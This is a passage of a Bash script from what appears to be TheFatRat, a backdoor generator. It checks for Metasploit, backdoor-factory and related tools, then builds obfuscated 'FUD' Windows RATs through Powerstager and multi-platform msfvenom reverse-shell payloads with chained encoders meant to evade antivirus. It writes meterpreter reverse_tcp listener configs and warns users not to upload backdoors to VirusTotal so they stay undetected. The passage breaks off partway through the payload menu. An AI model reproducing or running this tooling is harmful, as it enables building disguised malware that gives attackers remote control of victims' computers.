# check if ruby exists
      which ruby > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Ruby]: Installation found!;
else
   echo -e $red [x]::[warning]:this script require ruby to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install ruby ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 0.5

# check if apktool exists
      which $apktool > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Apktool]: Installation found!;
else
   echo -e $red [x]::[warning]:this script require apktool to work ;
   echo ""
   echo -e $red[!]::Run setup.sh to install apktool ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 0.5

# check if aapt exists
      which $aapt > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Aapt]: Installation found!;
else
   echo -e $red [x]::[warning]:this script require aapt to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install aapt ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 0.5

#another apache2 locate
    if [ "$distro" = "Ubuntu" ]; then
      apache2="/var/www"
    elif [ "$distro" = "Kali" ]; then
      apache2="/var/www/html"
    elif [ "$distro" = "BackBox" ]; then
      apache2="/var/www/html"
    else
      apache2="/var/www/html"
    fi
sleep 0.5
# check msfconsole
      which $msfconsole > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Msfconsole]: Installation found!;
else
   echo -e $red [x]::[warning]:this script require msfconsole installed to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install metasploit-framework ;
   sleep 0.5
exit 1
fi
sleep 0.5

# check if msfvenom exists
      which $msfvenom > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Msfvenom]: Installation found!;
else

   echo -e $red [x]::[warning]:this script require msfvenom installed to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install metasploit-framework ;
   sleep 0.5
exit 1
fi
sleep 0.5

# check mingw if exists
      which i586-mingw32msvc-gcc > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Mingw32]: Installation found!;
      COMPILER="i586-mingw32msvc-gcc"
else
      which x86_64-w64-mingw32-gcc > /dev/null 2>&1
      if [ $? -eq 0 ]; then
      echo -e $okegreen [✔]::[Mingw64]: Installation found!;
      COMPILER="x86_64-w64-mingw32-gcc"
else
   echo -e $red [x]::[warning]:this script require mingw32 or 64 installed to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install mingw ;
   sleep 0.5
   exit 1
 fi
fi
sleep 0.5


# check backdoor-factory if exists
      which $backdoor > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Backdoor-factory]: Installation found!;

else

   echo -e $red [x]::[warning]:this script require backdoor-factory installed to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install backdoor-factory ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 0.5

# check monodevelop if exists
      which mcs > /dev/null 2>&1
      if [ -d $find ]; then
      echo -e $okegreen [✔]::[Monodevelop-Utils]: Installation found!;

else

   echo -e $red [x]::[warning]:this script require monodevelop-utils to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install monodevelop-utils ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 0.5

# check xterm if exists
      which xterm > /dev/null 2>&1
      if [ -d $find ]; then
      echo -e $okegreen [✔]::[Xterm]: Installation found!;

else

   echo -e $red [x]::[warning]:this script require xterm to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install xterm ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 0.5
# check gnome-terminal if exists
      which gnome-terminal > /dev/null 2>&1
      if [ -d $find ]; then
      echo -e $okegreen [✔]::[Gnome-terminal]: Installation found!;

else

   echo -e $red [x]::[warning]:this script require gnome-terminal to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install gnome-terminal ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 0.5
# check upx if exists
      which upx > /dev/null 2>&1
      if [ -d $find ]; then
      echo -e $okegreen [✔]::[Upx]: Installation found!;

else

   echo -e $red [x]::[warning]:this script require upx to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install upx ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 0.5
# check dex2jar if exists
      which d2j-dex2jar > /dev/null 2>&1
      if [ -d $find ]; then
      echo -e $okegreen [✔]::[Dex2jar]: Installation found!;

else

   echo -e $red [x]::[warning]:this script require Dex2jar to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install dex2jar ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 2
#WARNING !!!
resize -s 33 68 > /dev/null
clear
echo -e $red""
echo "                                                                  ";
echo "=================================================================="
echo "         WARNING !  WARNING ! WARNING ! WARNING ! WARNING ! "
echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
echo "=================================================================="
echo " ____  _____ _____ _____    _____ _____ __    _____ _____ ____    ";
echo "|    \|     |   | |_   _|  |  |  |  _  |  |  |     |  _  |    \   ";
echo "|  |  |  |  | | | | | |    |  |  |   __|  |__|  |  |     |  |  |  ";
echo "|____/|_____|_|___| |_|    |_____|__|  |_____|_____|__|__|____/   ";
echo "                         _____ _____                              ";
echo "                        |_   _|     |                             ";
echo "                          | | |  |  |                             ";
echo "                          |_| |_____|                             ";
echo " _____ _____ _____ _____ _____    _____ _____ _____ _____ __      ";
echo "|  |  |     | __  |  |  |   __|  |_   _|     |_   _|  _  |  |     ";
echo "|  |  |-   -|    -|  |  |__   |    | | |  |  | | | |     |  |__   ";
echo " \___/|_____|__|__|_____|_____|    |_| |_____| |_| |__|__|_____|  ";
echo "=================================================================="
echo "       PLEASE DON'T UPLOAD BACKDOOR TO WWW.VIRUSTOTAL.COM "
echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
echo "=================================================================="
echo ""
echo -n "Press [Enter] key to continue .............."
read warning

##############################
#CHECKING POSTGRESQL
#############################
if ps ax | grep -v grep | grep postgresql > /dev/null
then
	clear
	resize -s 33 84 > /dev/null
	echo -e $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    	echo -e $white":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    	echo -e $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
        echo -e $lightgreen""
	echo "   ___________ _   _______________  ___  __  ___  ___  _______  _______";
	echo "  / __/ __/ _ \ | / /  _/ ___/ __/ / _ \/ / / / |/ / |/ /  _/ |/ / ___/";
	echo " _\ \/ _// , _/ |/ // // /__/ _/  / , _/ /_/ /    /    // //    / (_ / ";
	echo "/___/___/_/|_||___/___/\___/___/ /_/|_|\____/_/|_/_/|_/___/_/|_/\___/  ";
	echo "                                                                       ";
        echo -e $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    	echo -e $white":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
   	echo -e $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
	sleep 0.5

else
    resize -s 33 73 > /dev/null
    clear
    echo -e $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    echo -e  $white"::::::::::::::::::::$white "Metasploit service is not running"$white ::::::::::::::::::"
    echo -e  $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    echo ""
    echo -e $white		" 			             /)  "
    echo " 			            // "
    echo " 			            (( "
    echo " 			            // "
    echo " 			     .-.   //  .-. "
    echo " 			    /   \- ((=-/  \ "
    echo " 			    \       \     / "
    echo " 			     -( ___ ))__)-  "
    echo " 			     .-'   //  '-. "
    echo " 			    /     ((      \ "
    echo " 			    |       *     | "
    echo " 			    \             / "
    echo " 			     \   |_w_|   / "
    echo " 			     _)  \   /  (_ "
    echo "			jgs (((---'   '---))) "
    echo -e $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    echo -e $white":::::::::::::::: Wait for starting a Service  Postgresql ::::::::::::::::"
    echo -e $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
fi

#Started Service postgresql & apache
if [ "$distro" = "Kali" ]; then
/etc/init.d/postgresql start > /dev/null 2>&1
/etc/init.d/metasploit start > /dev/null 2>&1
/etc/init.d/apache2 start > /dev/null 2>&1
else
/etc/init.d/postgresql start > /dev/null 2>&1
/etc/init.d/metasploit start > /dev/null 2>&1
/etc/init.d/apache2 start > /dev/null 2>&1
fi
read -p "Press [Enter] key to Continue..."
clear
}
#########################
#CHECK DEPENDICIES
#########################
clear
echo -e $cyan"   ____ _               _    _                   "
echo "  / ___| |__   ___  ___| | _(_)_ __   __ _             "
echo " | |   | '_ \ / _ \/ __| |/ / | '_ \ / _\ |            "
echo " | |___| | | |  __/ (__|   <| | | | | (_| |  _   _   _ "
echo "  \____|_| |_|\___|\___|_|\_\_|_| |_|\__/ | (_) (_) (_)"
echo "                                     	|___/    "
echo -e $lightgreen'-- -- +=[(c) 2016-2017 | dracos-linux.org | Linuxsec.org | Hacker Indonesia '
echo -e $cyan'-- -- +=[ Author: Screetsec < Edo Maland >  ]=+ -- -- '
echo -e " "

if [ $(id -u) != "0" ]; then

      echo -e $red [!]::[Check Dependencies] ;
      sleep 0.5
      echo -e $red [✔]::[Check User]: $USER ;
      echo -e $red [✔]::[Distro]: $distro ;
      echo -e $red [✔]::[Release]: $rlname ;
      sleep 0.5
      echo -e $red [x]::[not root]: you need to be [root] to run this script.;
      echo ""
   	  sleep 1
	  exit


else

   echo -e $okegreen [!]::[Check Dependencies]: ;
   sleep 0.5
   echo -e $okegreen [✔]::[Distro]: $distro ;
   echo -e $okegreen [✔]::[Release]: $rlname ;
   echo -e $okegreen [✔]::[Check User]: $USER ;

sleep 0.5
fi

#Checking if user is using a local terminal or a remote shell
if [ -n "$SSH_CLIENT" ] || [ -n "$SSH_TTY" ]; then
  echo -e $red [✔]::[Terminal]: remote ;
echo ""
    echo -e $red "Fatrat & Setup does not work over a remote secure shell ."
    echo ""
echo -e $green "If you want to Install Fatrat on a remote computer then "
echo -e $green "use a remote desktop connection like (rdesktop) or (vnc) "
echo ""
echo -e $green "Press [ENTER] key to exit"
read abor
exit 1
else
sleep 0.5
echo -e $okegreen [✔]::[Terminal]: local ;
  case $(ps -o comm= -p $PPID) in
    sshd|*/sshd) SESSION_TYPE=remote/ssh;;
  esac
fi

sleep 0.5
#Checking internet connection by connecting to google over http
#case fails then run chknet function (ping)
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo -e $red [ X ]::[Internet Connection]: OFFLINE!;
chknet
    sleep 1
else
echo -e $okegreen [✔]::[Internet Connection]: CONNECTED!;
    sleep 1
    cont
fi

#ping -c 1 google.com > /dev/null 2>&1
#png="$?"
# if [ $png == "0" ]
#then
#    echo -e $okegreen [✔]::[Internet Connection]: CONNECTED!;
#    sleep 0.5
#    cont
#elif [ $png == "1" ]
#then
#    echo -e $yellow [✔]::[Internet Connection]: LOCAL ONLY!;
#    chknet
#elif [ $png == "2" ]
#then
#echo -e $red [✔]::[Internet Connection]: OFFLINE!;
#chknet
#fi

function Stop() {
  #Stoped Service postgresql & apache
  if [ "$distro" = "Kali" ]; then
  /etc/init.d/postgresql stop > /dev/null 2>&1
  /etc/init.d/metasploit stop > /dev/null 2>&1
  /etc/init.d/apache2 stop > /dev/null 2>&1
  else
  /etc/init.d/metasploit stop > /dev/null 2>&1
  /etc/init.d/apache2 stop > /dev/null 2>&1
  /etc/init.d/postgresql stop > /dev/null 2>&1
  fi

}

function pstagef() {

# Powerstager file will be stored in main fatrat directory
# Checking if file was created

fout="$path/output"
if [ -f $fstager ]
then
echo ""
echo -e $red "[✔] Your FUD Rat file was created succefully"
spinlong
sleep 2
else
echo -e $red ""
echo "[x] There was an error creating your FUD rat with Powerstager ."
echo -e $okegreen ""
echo "Press [ENTER] key to continue to return to fatrat menu"
read rmenu
clear
menu

fi

#File was created , now checking if file name exists in final output directory
# In case there is already a file in output dir with same name , then rename it

ren=`shuf -i 1-1000 -n 1`
chk="$path/output/$fira.exe"
if [ -f "$chk" ]; then
mv $chk $path/output/old_$ren.exe >> $logfud 2>&1
echo -e $yellow " "
echo " [!] FatRat Detected that you already had a previous created FUD"
echo "file in ($path/output/) with the name $fira.exe ."
echo -e $okegreen ""
echo " [✔] FatRat have renamed your old FUD Rat to old_$ren.exe"
echo ""
echo -e $cyan "[*] You can find your file in :
$path/output/old_$ren.exe"
else
mv $fstager $path/output/$fira.exe >> $logfud 2>&1
echo ""
echo -e $cyan "[*] You can find your file in :
$chk"
echo ""
fi

#Option to create a listener
echo ""
echo -e $okegreen "Do you want to create a listener for this configuration"
echo -e $okegreen "to use in msfconsole in future ?"
echo ""
echo -ne "Choose y/n : ";tput sgr0
read sel
case $sel in
y|Y|yes|Yes|YES)
echo ""
echo -e $green "Write the name for this config . (ex : pstager)"
echo -ne "Filename : ";tput sgr0
read fname
#checking if user compiled a 32bit or 64bit ese in powerstager
if [ $met == "32" ]
#32bit exe created
then
#checking if user wrote any input for listener name
if [ -z $fname ]
then
svf=$path/config/listeners/pstager32.rc
rm -rf $svf >/dev/null 2>&1
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/pstager32.rc"
echo ""
else
svf=$path/config/listeners/$fname.rc
rm -rf $svf >/dev/null 2>&1
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/$fname.rc"
echo ""
fi
elif [ $met == "64" ]
then
#64bit exe created
if [ -z $fname ]
then
#user did not wrote any input for the listener , then write default name
svf=$path/config/listeners/pstager64.rc
rm -rf $svf >/dev/null 2>&1
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/pstager64.rc"
echo ""
else
#user wrote a name for the listener
svf=$path/config/listeners/$fname.rc
rm -rf $svf >/dev/null 2>&1
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/$fname.rc"
echo ""
fi
fi
;;
n|N|no|No|NO)
# no msfconsole configuration option selected
echo ""
;;
*)
echo "Wrong input "
echo "No configuration created ."
echo ""
;;
esac

echo ""
echo -e $okegreen "Press [ENTER] key to return to FUDWIN menu"
read fwin
fudwin
}

function fudwin() {
    rm -rf $logfud > /dev/null 2>&1
    touch $logfud > /dev/null 2>&1
    clear
    echo -e $okegreen "  _______ ___ ___ ______   ___ ___ ___ ______  "
    echo -e $okegreen " |   _   |   Y   |   _  \ |   Y   |   |   _  \ "
    echo -e $okegreen " |.  1___|.  |   |.  |   \|.  |   |.  |.  |   |"
    echo -e $okegreen " |.  __) |.  |   |.  |    |. / \  |.  |.  |   |"
    echo -e $okegreen " |:  |   |:  1   |:  1    |:      |:  |:  |   |"
    echo -e $okegreen " |::.|   |::.. . |::.. . /|::.|:. |::.|::.|   |"
    echo -e $okegreen "  ---     ------- ------   --- --- --- --- ---  $cyan 1.0"

    echo -e $cyan ""
    echo -e $cyan "Select one tool to create your Windows EXE FUD Rat "
    echo -e $cyan ""
    echo ""
    echo -e $white "[$okegreen 1$white ]$okegreen -$yellow Powerstager 0.2.5 by z0noxz (powershell) $okegreen(NEW)"
    echo -e $white "[$okegreen 2$white ]$okegreen -$yellow Slow But Powerfull $okegreen(OLD)"
    echo -e $white "[$okegreen 3$white ]$okegreen -$yellow Return to menu"
    echo ""
    echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"FUDWIN$okegreen]:"
  	echo -ne $okegreen" └─────► " ;tput sgr0
  	read fwin

case $fwin in
    1)
    echo ""
    spinlong
    echo -e $okegreen "\n"
    echo -e $yellow "  Your local IPV4 address is : $lanip"
    echo -e $yellow "  Your local IPV6 address is : $lanip6"
    echo -e $yellow "  Your public IP address is : $publicip"
    echo -e $yellow "  Your Hostname is : $hostn"
    echo -e $okegreen""
    #Case default lhost & lport config file does not exist then fill variables with ""
    if [ ! -f "$defcon" ]
    then
    yourip=""
    yourport=""
    fi
    # If variable ip is empty (no default config) then popup user input
    if [ -z "$yourip" ]; then
    read -p '   Set LHOST IP: ' yourip
    fi
    # If variable local port is empty (no default config) then popup user input
    echo -e $okegreen ""
    if [ -z "$yourport" ]; then
    read -p '   Set LPORT: ' yourport
    fi
    echo ""
    read -p '   Please enter the base name for output files : ' fira
    #Go make a check if user inputed any value or not
    invalid
    #From invalid , a variable will return with 0 or 1 , if 1 then abort & return to fudwin menu
    if [ $err == "1" ]
    then
    echo -e $okegreen ""
    echo -n "Press [ENTER] key to return to menu ."
    read inp
    fudwin
    fi
    #check if ming64 exists and provide 32bit or 64bit option to create rat
    which x86_64-w64-mingw32-gcc >> $logfud 2>&1
    if [ "$?" -eq "0" ]; then
    spinlong
    echo ""
    echo -e $yellow "  Select Windows Architeture target"
    echo ""
    echo -e $cyan "    1 -$okegreen 32Bit (XP,7,Vista)"
    echo -e $cyan "    2 -$okegreen 64Bit (XP64,Vista,7,8,10)"
    echo ""
    echo -ne $lightgreen "Choose (1,2) : "
    read choice
    if [ $choice == "1" ]
    then
    spinlong
    echo ""
icfold="$path/icons"
    lit=`ls -1 $icfold/*.ico 2>/dev/null | wc -l`
    if [ $lit != 0 ]
                  then
echo -e $orange "  +--------------------+"
echo -e $orange "  |$okegreen Current icons list$orange |"
echo -e $orange "  +--------------------+"
for liste in icons/*.ico; do
                  echo ${liste##*/}
    done
    echo -e $orange "  +---------------------+"
    echo ""
    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE or press [ENTER] key for default icon"
    echo ""
                  echo -ne "   Filename : ";tput sgr0
                  read fname
fi
if [ -z $fname ]
                  then
    echo ""
echo -e $red "No file name was written"
echo ""
 echo -e $okegreen "Building EXE with default icon"
spinlong
echo ""
    echo -e $red "[*] Builing your powerstage rat for windows with the following values"
    echo ""
    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
    echo -e $yellow "  Your Port     :$okegreen $yourport"
    echo -e $yellow "  Rat Filename  :$okegreen $fira"
    fstager=$path/$fira
    echo
    echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
    sleep 4
    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
    #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
    met="32"
    pstagef
fi
if [ ! -f $icfold/$fname ]
then
echo ""
echo -e $red "The Filename you wrote does not exist in icons folder."
echo ""
 echo -e $okegreen "Building EXE with default icon"
spinlong
echo ""
  echo -e $red "[*] Builing your powerstage rat for windows with the following values"
echo ""
    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
    echo -e $yellow "  Your Port     :$okegreen $yourport"
    echo -e $yellow "  Rat Filename  :$okegreen $fira"
    fstager=$path/$fira
    echo
    echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
    sleep 4
    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
    #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
    met="32"
    pstagef
else
echo ""
spinlong
echo ""
    echo -e $red "[*] Builing your powerstage rat for windows with the following values"
    echo ""
    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
    echo -e $yellow "  Your Port     :$okegreen $yourport"
    echo -e $yellow "  Rat Filename  :$okegreen $fira"
    echo -e $yellow "  Icon filename :$okegreen $fname"
    fstager=$path/$fira
    echo
    echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
met="32"
    pstagef
fi

elif [ $choice == "2" ]
  then
echo ""
spinlong
echo ""
icfold="$path/icons"
    lit=`ls -1 $icfold/*.ico 2>/dev/null | wc -l`
    if [ $lit != 0 ]
                  then
echo -e $orange "  +--------------------+"
echo -e $orange "  |$okegreen Current icons list$orange |"
echo -e $orange "  +--------------------+"
for liste in icons/*.ico; do
                  echo ${liste##*/}
    done
    echo -e $orange "  +---------------------+"
    echo ""
    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE or press [ENTER] key for default icon"
    echo ""
                  echo -ne "   Filename : ";tput sgr0
                  read fname
fi
if [ -z $fname ]
                  then
    echo ""
echo -e $red "No file name was written"
echo ""
 echo -e $okegreen "Building EXE with default icon"
spinlong
echo ""
    echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
    echo ""
    echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
    echo -e $yellow "  Your Port     :$okegreen $yourport"
    echo -e $yellow "  Rat Filename  :$okegreen $fira"
    fstager=$path/$fira
    python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
    #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
    met="64"
    pstagef
fi
if [ ! -f $icfold/$fname ]
then
echo ""
echo -e $red "The Filename you wrote does not exist in icons folder."
echo ""
 echo -e $okegreen "Building EXE with default icon"
spinlong
    echo -e $red "[*] Builing your powerstager rat for windows with the following values"
    echo ""
echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
    echo -e $yellow "  Your Port     :$okegreen $yourport"
    echo -e $yellow "  Rat Filename  :$okegreen $fira"
    fstager=$path/$fira
    python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
    #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
    met="64"
    pstagef
else
echo ""
spinlong
echo ""
    echo -e $red "[*] Builing your powerstage rat for windows with the following values"
    echo ""
    echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
    echo -e $yellow "  Your Port     :$okegreen $yourport"
    echo -e $yellow "  Rat Filename  :$okegreen $fira"
    echo -e $yellow "  Icon filename :$okegreen $fname"
    fstager=$path/$fira
    echo ""
  python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
    #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
    met="64"
    pstagef
fi
    else
    fudwin
    fi
   fi
    ;;
2)
#slowbutpowerfull selection
    chmod +x powerfull.sh
    xterm -fa monaco -fs 13 -bg black ./powerfull.sh
    clear
    menu
    ;;
3)
   clear
   menu
;;
*)
   clear
   echo -e $red "  Incorrect Number"
   echo ""
   sleep 2
   fudwin
   ;;
  esac
}

function cmsfvenom() {
clear
echo -e $okegreen"  ===================================================================== "
echo -e " |  $cyan  Create Payload with msfvenom ( must install msfvenom )  $okegreen         | "
echo -e $okegreen"  ===================================================================== "
echo -e $red"  ___________ "
echo -e " |           |======[***   $yellow    ____                _             "
echo -e $red" | $yellow MSFVENOM $red \ 	    $yellow / ___|_ __ ___  ____| |_ ___  _ __ "
echo -e $red" |_____________\_______    $yellow  | |   | '__/ _ \/ _  | __/ _ \| '__|"
echo -e $red" |==[v1.3 >]===========\   $yellow  | |___| | |  __/ (_| | || (_) | |   "
echo -e $red" |______________________\  $yellow   \____|_|  \___|\____|\__\___/|_|    "
echo -e $yellow"  \(@)(@)(@)(@)(@)(@)(@)/ "
echo -e $red"  *********************  "
echo ""
echo -e $okegreen"  ===================================================================== "
echo -e " |                     $cyan        Created by $red Edo Maland  ( Screetsec )  $okegreen | "
echo -e $okegreen"  ===================================================================== "
echo ""
 			echo -e $okegreen "	[1]  LINUX >> FatRat.elf"
 			echo -e $okegreen"	[2]  WINDOWS >> FatRat.exe"
			echo -e $okegreen"        [3]  SIGNED ANDROID >> FatRat.apk"
 			echo -e $okegreen"	[4]  MAC >> FatRat.macho"
 			echo -e $okegreen"	[5]  PHP >> FatRat.php"
 			echo -e $okegreen"	[6]  ASP >> FatRat.asp"
 			echo -e $okegreen"	[7]  JSP >> FatRat.jsp"
 			echo -e $okegreen"	[8]  WAR >> FatRat.war"
 			echo -e $okegreen"	[9]  Python >> FatRat.py "
			echo -e $okegreen"	[10] Bash >> FatRat.sh"
			echo -e $okegreen"	[11] Perl >> FatRat.pl"
			echo -e $okegreen"	[12] doc >> Microsoft.doc "$yellow"( not macro attack )"
			echo -e $okegreen"	[13] rar >> bacdoor.rar "$yellow"( Winrar old version)"
			echo -e $okegreen"	[14] dll >> FatRat.dll"
			echo -e $okegreen"        [15] Back to Menu "
 			echo -e " "
  	 		echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"creator$okegreen]:"
			echo -ne $okegreen" └─────► " ;tput sgr0
 			read fatrat1
			if test $fatrat1 == '1'
				then
				echo ""
				spinlong
				# Show user current lanip , public ip & current hostname
        			echo -e $okegreen"\n"
				echo -e $yellow "  Your local IPV4 address is : $lanip"
        			echo -e $yellow "  Your local IPV6 address is : $lanip6"
				echo -e $yellow "  Your public IP address is : $publicip"
				echo -e $yellow "  Your Hostname is : $hostn"
				echo -e $okegreen""

#checking if default lhost & lport config exists
# If config does not exists then set lhost & lport values to no value

        if [ ! -f "$defcon" ]
        then
          yourip=""
          yourport=""
        fi

#If lhost & lport values are null then popup user manual input

        if [ -z "$yourip" ]; then
				read -p '   Set LHOST IP: ' yourip
        fi
        echo -e $okegreen ""
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo
        read -p '   Please enter the base name for output files : ' fira

# Checking if user filled lhost , lport & filename with any input
# Case any of these inputs are blank then "invalid" function will popup a message to user
# and will return to msfvenom menu

        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
        pldlnx
        spinlong
	echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo ""
      	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > output/$fira.elf

# Checking if file was created
        fileout="output/$fira.elf"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created and it is stored in : $path/output/$fira.elf"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi

	elif test $fatrat1 == '2'
	then


	echo ""
	spinlong
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
	if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi
        if [ -z "$yourport" ]; then
        echo ""
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
	invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
        pldwin
        spinlong
	echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo ""
	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | $msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | $msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| $msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | $msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o output/$fira.exe

# Checking if file was created
        fileout="output/$fira.exe"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created and it is stored in : $path/output/$fira.exe"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi

	elif test $fatrat1 == '3'
	then
	echo ""
	spinlong
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
